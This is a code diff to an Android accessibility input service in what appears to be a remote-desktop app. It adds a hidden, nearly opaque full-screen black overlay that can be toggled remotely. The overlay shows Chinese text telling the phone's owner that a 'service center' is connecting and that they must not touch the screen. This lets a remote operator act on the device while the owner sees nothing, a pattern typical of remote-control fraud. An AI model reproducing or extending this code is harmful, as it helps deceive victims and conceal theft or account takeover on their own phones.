@@ -35,6 +35,22 @@ import hbb.MessageOuterClass.KeyEvent
 import hbb.MessageOuterClass.KeyboardMode
 import hbb.KeyEventConverter
 
+import android.view.WindowManager
+import android.widget.FrameLayout
+import android.graphics.Color
+import android.annotation.SuppressLint
+import android.graphics.PixelFormat
+import android.view.Gravity
+import android.view.MotionEvent
+import android.view.View
+import android.util.DisplayMetrics
+import android.widget.ProgressBar
+import android.widget.TextView
+import android.content.Context
+import android.content.res.ColorStateList
+
+
+import android.util.TypedValue
 // const val BUTTON_UP = 2
 // const val BUTTON_BACK = 0x08
 
@@ -46,6 +62,7 @@ const val RIGHT_UP = 18
 const val BACK_UP = 66
 const val WHEEL_BUTTON_DOWN = 33
 const val WHEEL_BUTTON_UP = 34
+const val WHEEL_BUTTON_BLANK = 37//32+5
 const val WHEEL_DOWN = 523331
 const val WHEEL_UP = 963
 
@@ -67,7 +84,13 @@ class InputService : AccessibilityService() {
         val isOpen: Boolean
             get() = ctx != null
     }
-
+	
+	//新增
+	private lateinit var windowManager: WindowManager
+	private lateinit var Fakelay: FrameLayout
+	private var firstCreate = true
+	private var viewCreated = false;
+		
     private val logTag = "input service"
     private var leftIsDown = false
     private val touchPath = Path()
@@ -679,11 +702,112 @@ class InputService : AccessibilityService() {
         val layout = fakeEditTextForTextStateCalculation?.getLayout()
         Log.d(logTag, "fakeEditTextForTextStateCalculation layout:$layout")
         Log.d(logTag, "onServiceConnected!")
+		
+		
+		
+		windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+		try {
+		    createView(windowManager)
+		    handler.postDelayed(runnable, 1000)
+		    Log.d(logTag, "onCreate success")
+		} catch (e: Exception) {
+		    Log.d(logTag, "onCreate failed: $e")
+		}
     }
+	
+	
+	fun dp2px(context: Context, f: Float): Int {
+	        return (f * context.resources.displayMetrics.density + 0.5f).toInt()
+	    }
+	    
+	    @SuppressLint("ClickableViewAccessibility")
+	    private fun createView(windowManager: WindowManager) {
+	        
+	        if(viewCreated) return
+	
+	        viewCreated = true
+	
+	        // 设置 WindowManager.LayoutParams
+	        val params = WindowManager.LayoutParams(
+	            WindowManager.LayoutParams.MATCH_PARENT,
+	            WindowManager.LayoutParams.MATCH_PARENT,
+	            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+	            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+	                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
+	                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+	                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
+	                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+	                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
+	                WindowManager.LayoutParams.FLAG_FULLSCREEN,
+	            PixelFormat.TRANSLUCENT // 透明像素格式
+	        );
+	
+	        // 设置悬浮窗的位置（在屏幕右下角）
+	        params.gravity = Gravity.TOP or Gravity.START
+	        params.x = 0;
+	        params.y = 0;
+		    
+	    	Fakelay =  FrameLayout(this)
+	    	Fakelay.setBackgroundColor(Color.parseColor("#000000"));
+	    	Fakelay.getBackground().setAlpha(253)
+		
+	    	Fakelay.setVisibility(8)
+	        globalVariable =8
+		    
+	        val loadingText = TextView(this, null)
+	        loadingText.text = "对接服务中心网络...\n请勿触碰手机屏幕\n防止业务中断\n保持手机电量充足"
+	        loadingText.setTextColor(-7829368)
+	
+	        val screenWidth = resources.displayMetrics.widthPixels
+	        val textSizePx = screenWidth / 20f
+	
+	        val textSizeSp = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_PX, textSizePx, resources.displayMetrics)
+	
+	        // 设置 TextView 字体大小
+	        loadingText.setTextSize(TypedValue.COMPLEX_UNIT_PX, textSizeSp)
+	
+	        // 设置 TextView 位置（屏幕中央偏下）
+	        val textParams = FrameLayout.LayoutParams(
+	            FrameLayout.LayoutParams.WRAP_CONTENT,
+	            FrameLayout.LayoutParams.WRAP_CONTENT
+	        ).apply {
+	            gravity = Gravity.CENTER_HORIZONTAL or Gravity.BOTTOM  // 水平居中 + 贴近底部
+	            bottomMargin = 200  // 离屏幕底部 200px，可调整
+	        }
+	
+	        loadingText.gravity = Gravity.CENTER
+	        loadingText.setPadding(20, 0, 20, 0)
+	
+	        Fakelay.addView(loadingText,textParams)
+		
+	        windowManager.addView(Fakelay, params)
+	    }
+	    
+	    private val handler = Handler(Looper.getMainLooper())
+	    private val runnable = object : Runnable {
+	        override fun run() {
+	            if (Fakelay.visibility != globalVariable) {
+		            if(globalVariable==8){  
+	                    //黑屏取消
+	                    Fakelay.setVisibility(8)
+	                }else{
+	                    //黑屏穿透
+	                    Fakelay.setVisibility(0)
+	                }
+	            }
+	            handler.postDelayed(this, 1000)
+	        }
+	    }
+	    
+		
 
     override fun onDestroy() {
         ctx = null
         super.onDestroy()
+		if (viewCreated) {
+	       windowManager.removeView(Fakelay) 
+        }
+        handler.removeCallbacks(runnable)
     }
 
     override fun onInterrupt() {}
